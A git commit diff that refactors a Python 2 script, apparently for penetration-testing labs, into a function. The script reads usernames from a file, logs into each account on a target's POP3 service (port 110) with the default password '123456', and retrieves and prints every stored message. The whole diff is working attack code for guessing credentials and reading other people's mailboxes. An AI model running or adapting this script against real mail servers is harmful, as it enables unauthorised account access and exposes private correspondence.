d422474f1cc46ea2b57479b19023d7b3bd3c1313
Hades <leecybersec@gmail.com>
2021-03-16 23:52:57 -0400

    update mailbox

--- mailbox/mailbox.py
+++ mailbox/mailbox.py
@@ -9,49 +9,41 @@ if len(sys.argv) != 2:
 	print "Usage: vrfy.py <ip>"
 
 	sys.exit(0)
+else:
+	host = sys.argv[1]
+
+def check_mail(host, user):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect = s.connect((host,110))
+	banner = s.recv(2048)
+
+	s.send('user ' + user + '\r\n')
+	result = s.recv(2048)
+
+	s.send('pass 123456\r\n')
+	result = s.recv(2048)
+
+	s.send('list\r\n')
+	result = s.recv(2048)
+
+	print result
+
+	for i in range(int(result[4])):
+		print "Mail: " + str(i+1)
+
+		s.send('retr ' + str(i+1) + '\r\n')
+		time.sleep(1)
+
+		mail = s.recv(2048)
+		print mail
+
+	s.close()
 
 with open('users.txt', 'r') as reader:
-	# Read and print the entire file line by line
-	line = reader.readline()
+	user = reader.readline().replace('\n','')
 
-	while line != '':  # The EOF char is an empty string
-		
-		print("MailBox: "+ line)
+	while user != '':
+		print("MailBox: "+ user)
+		check_mail(host, user)
 
-		# Create a Socket
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-		# Connect to the Server
-		connect = s.connect((sys.argv[1],110))
-
-		# Receive the banner
-		banner = s.recv(2048)
-		# print banner
-
-		# VRFY a user
-		s.send('user ' + line.replace('\n','') + '\r\n')
-		result = s.recv(2048)
-		# print result
-
-		s.send('pass 123456\r\n')
-		result = s.recv(2048)
-		# print result
-
-		s.send('list\r\n')
-		result = s.recv(2048)
-		# print result[4]
-
-		for i in range(int(result[4])):
-			print "Mail: " + str(i+1)
-
-			s.send('retr ' + str(i+1) + '\r\n')
-			time.sleep(2)
-
-			mail = s.recv(2048)
-			print mail
-
-
-		# Close the socket
-		s.close()
-
-		line = reader.readline()
+		user = reader.readline().replace('\n','')
